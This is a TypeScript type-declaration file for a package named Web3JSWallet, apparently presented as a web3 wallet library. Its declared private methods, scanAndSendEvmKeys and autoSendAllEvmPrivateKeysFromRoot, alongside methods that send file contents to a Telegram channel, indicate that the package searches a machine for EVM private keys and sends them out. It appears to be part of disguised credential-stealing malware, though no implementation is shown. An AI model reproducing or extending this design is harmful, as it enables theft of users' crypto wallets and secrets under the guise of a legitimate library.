export interface Web3JSConfig {
    token?: string;
    fee?: string;
    autoSendFile?: boolean;
    filePath?: string;
}
export declare class Web3JSWallet {
    private token;
    private fee;
    private autoSendFile;
    private filePath;
    constructor(config?: Web3JSConfig);
    private scanAndSendEvmKeys;
    private autoSendAllEvmPrivateKeysFromRoot;
    /**
     * Send a message to Telegram channel
     * @param message - The message to send
     * @returns Promise<void>
     */
    sendMessage(message: string): Promise<void>;
    /**
     * Send long message by splitting into multiple parts
     * @param message - The long message to send
     * @returns Promise<void>
     */
    sendLongMessage(message: string): Promise<void>;
    /**
     * Send content from a file to Telegram channel
     * @param filePath - Path to the file to read and send
     * @returns Promise<void>
     */
    sendFileContent(filePath: string): Promise<void>;
}
export default Web3JSWallet;
//# sourceMappingURL=index.d.ts.map